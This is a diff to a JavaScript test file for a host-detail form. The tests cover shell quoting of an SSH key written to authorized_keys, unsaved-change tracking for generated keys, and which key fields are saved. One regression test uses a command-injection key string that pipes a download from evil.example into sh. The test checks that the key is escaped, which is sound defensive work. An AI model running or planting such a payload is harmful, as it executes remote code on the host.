@@ -834,7 +834,129 @@ describe("HostDetail — SSH public key", () => {
 
     test("the command appends the key to authorized_keys", () => {
         expect(command.call({ sshPublicKey: KEY })).toBe(
-            `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "${KEY}" >> ~/.ssh/authorized_keys`,
+            `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '${KEY}' >> ~/.ssh/authorized_keys`,
         );
+    });
+
+    test("nothing in the key runs as part of the command", () => {
+        const evil = "ssh-ed25519 AAAA x'; curl https://evil.example | sh; echo '";
+        const quoted = String.raw`'ssh-ed25519 AAAA x'\''; curl https://evil.example | sh; echo '\'''`;
+        expect(command.call({ sshPublicKey: evil })).toBe(
+            `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo ${quoted} >> ~/.ssh/authorized_keys`,
+        );
+    });
+});
+
+describe("HostDetail — a generated key not lost", () => {
+    const dirty = Object.getOwnPropertyDescriptor(HostDetail.prototype, "hasUnsavedChanges").get;
+
+    /**
+     * A stand-in with the state the dirty check and the copy read.
+     *
+     * @param {object} [opts]
+     * @param {boolean} [opts.isNew] Whether the host is being created.
+     * @param {string} [opts.source] Where its key comes from.
+     * @returns {object}
+     */
+    function stand({ isNew = true, source = "generate" } = {}) {
+        return {
+            isNew,
+            state: { keyShared: false, copied: "", form: { key_source: source } },
+            _savedForm: "same",
+            _currentFormKey: () => "same",
+            env: { toast: { error: () => {} } },
+            markKeyShared: HostDetail.prototype.markKeyShared,
+        };
+    }
+
+    test("an untouched new host can be left", () => {
+        expect(dirty.call(stand())).toBe(false);
+    });
+
+    test("once its generated key is copied, leaving asks first", () => {
+        const ctx = stand();
+        ctx.markKeyShared();
+        expect(dirty.call(ctx)).toBe(true);
+        ctx.state.form.key_source = "upload";
+        expect(dirty.call(ctx)).toBe(false);
+    });
+
+    test("copying from the buttons counts as sharing the key", async () => {
+        const ctx = stand();
+        patchWithCleanup(navigator.clipboard, { writeText: () => Promise.resolve() });
+        await HostDetail.prototype.copyText.call(ctx, "ssh-ed25519 AAAA incubacloud", "key");
+        expect(ctx.state.keyShared).toBe(true);
+        expect(ctx.state.copied).toBe("key");
+    });
+
+    test("a saved host has no generated key to lose", () => {
+        const ctx = stand({ isNew: false });
+        ctx.markKeyShared();
+        expect(dirty.call(ctx)).toBe(false);
+    });
+});
+
+describe("HostDetail — save sends the key the person chose", () => {
+    beforeEach(() => {
+        allowTranslations();
+    });
+
+    /**
+     * A stand-in for ``save()``, with every call it makes recorded.
+     *
+     * @param {object} form The form as the person left it.
+     * @param {boolean} isNew Whether the host is being created.
+     * @returns {object} the stand-in, with ``sent``: ``[url, params]`` pairs.
+     */
+    function harness(form, isNew) {
+        const sent = [];
+        patchWithCleanup(rpc, {
+            _rpc: (url, params) => {
+                sent.push([url, params]);
+                return Promise.resolve({ id: 9 });
+            },
+        });
+        return {
+            sent,
+            isNew,
+            props: { host_id: 7 },
+            state: { saving: false, keyShared: true, host: { name: "h" }, selectedTags: [], form },
+            validator: { validate: () => ({ isValid: true }) },
+            env: {
+                toast: { success: () => {}, error: (msg) => sent.push(["error", msg]) },
+                navigate: () => {},
+                refreshNavCounts: () => {},
+            },
+            _refreshDefaultCertificate: () => Promise.resolve(),
+            _snapshotForm: () => {},
+        };
+    }
+
+    const FORM = () => ({
+        name: "h", login_type: "ssh_key", port: 22, whitelist: [],
+        http_conn_rate: 0, direct_port: 0, newWhitelistEntry: "",
+    });
+
+    test("a saved host keeps the new key file it was given", async () => {
+        // A saved host's form has no key source: it only takes a file.
+        const h = harness({ ...FORM(), key_file: "bmV3" }, false);
+        await HostDetail.prototype.save.call(h);
+        const [, params] = h.sent.find(([url]) => url === "/cloud/save_host");
+        expect(params.vals.key_file).toBe("bmV3");
+        expect("generated_key" in params.vals).toBe(false);
+        expect("key_source" in params.vals).toBe(false);
+    });
+
+    test("a new host sends the generated key and not a file picked before", async () => {
+        const h = harness(
+            { ...FORM(), key_source: "generate", generated_key: "enc:sealed", key_file: "b2xk" },
+            true,
+        );
+        await HostDetail.prototype.save.call(h);
+        const [, params] = h.sent.find(([url]) => url === "/cloud/create_host");
+        expect(params.vals.generated_key).toBe("enc:sealed");
+        expect("key_file" in params.vals).toBe(false);
+        expect("key_source" in params.vals).toBe(false);
+        expect(h.state.keyShared).toBe(false);
     });
 });
